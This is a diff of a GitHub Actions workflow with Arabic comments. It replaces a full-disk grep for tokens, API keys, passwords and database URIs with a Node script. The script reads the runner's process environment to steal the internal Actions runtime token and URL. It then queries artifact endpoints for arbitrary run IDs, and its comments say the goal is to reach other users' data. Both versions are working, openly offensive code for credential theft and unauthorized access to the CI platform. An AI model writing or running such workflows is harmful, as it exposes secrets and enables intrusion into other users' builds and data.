@@ -1,20 +1,73 @@
-name: Full Disk Secret Recon
+name: Advanced Internal API IDOR
 on: [push]
 jobs:
-  recon:
+  test:
     runs-on: ubuntu-latest
     steps:
-      - name: Scan Entire Filesystem for Secrets
+      # خطوة وهمية لإجبار GitHub على حقن متغيرات الـ Runtime
+      - name: Dummy Cache Trigger
+        uses: actions/cache@v3
+        with:
+          path: |
+            ~/.npm
+          key: ${{ runner.os }}-dummy-${{ github.run_id }}
+          restore-keys: |
+            ${{ runner.os }}-dummy-
+      
+      - name: Tamper API Requests for IDOR
         run: |
-          echo "Starting full disk secret scan..."
-          
-          # البحث في الهارد بالكامل (/)، مع تجاهل مجلدات النظام الوهمية لكي لا يعلق السيرفر
-          # -I: تجاهل الملفات الثنائية (Binary files)
-          # -r: البحث في كل المجلدات الفرعية
-          # -E: استخدام التعابير النمطية الممتدة
-          
-          grep -rnI -E "(ghp_|gho_|github_pat_|AKIA|ASIA|sk-ant-|sk-|password|passwd|api_key|secret|token|mongodb://|postgres://|mysql://|eyJ)" / \
-          --exclude-dir={proc,sys,dev,snap,run,mnt,media,boot,libx32,lib32,lost+found,srv} \
-          2>/dev/null | head -n 100
-          
-          echo "Scan complete."
+          node -e "
+            const fs = require('fs');
+            const https = require('https');
+
+            // 1. استخراج المتغيرات السرية من ذاكرة الـ Runner
+            const envStr = fs.readFileSync('/proc/self/environ', 'utf8');
+            const envVars = envStr.split('\0');
+            const env = {};
+            for (const pair of envVars) {
+              const idx = pair.indexOf('=');
+              if (idx > 0) env[pair.substring(0, idx)] = pair.substring(idx + 1);
+            }
+
+            const runtimeUrl = env.ACTIONS_RUNTIME_URL;
+            const token = env.ACTIONS_RUNTIME_TOKEN;
+
+            if (runtimeUrl && token) {
+              console.log('Successfully extracted internal token and URL.');
+              
+              // 2. المسار الخاص بطلب الـ Artifacts
+              // نقوم بتغيير الـ Run ID إلى أرقام عشوائية لمحاولة الوصول لبيانات مستخدمين آخرين
+              const idorTargets = [
+                runtimeUrl + '_apis/runs/1/artifacts?api-version=6.0-preview.1',
+                runtimeUrl + '_apis/runs/9999999999/artifacts?api-version=6.0-preview.1',
+                runtimeUrl + '_apis/runs/100000000/artifacts?api-version=6.0-preview.1'
+              ];
+
+              idorTargets.forEach(testUrl => {
+                const parsedUrl = new URL(testUrl);
+                const options = {
+                  hostname: parsedUrl.hostname,
+                  path: parsedUrl.pathname + parsedUrl.search,
+                  method: 'GET',
+                  headers: {
+                    'Authorization': 'Bearer ' + token,
+                    'Accept': 'application/json'
+                  }
+                };
+
+                const req = https.request(options, (res) => {
+                  let data = '';
+                  res.on('data', (chunk) => data += chunk);
+                  res.on('end', () => {
+                    console.log('\\nTarget:', testUrl);
+                    console.log('Status:', res.statusCode);
+                    console.log('Response:', data.substring(0, 300));
+                  });
+                });
+                req.on('error', (e) => console.error('Error:', e.message));
+                req.end();
+              });
+            } else {
+              console.log('Failed to extract internal runtime tokens.');
+            }
+          "
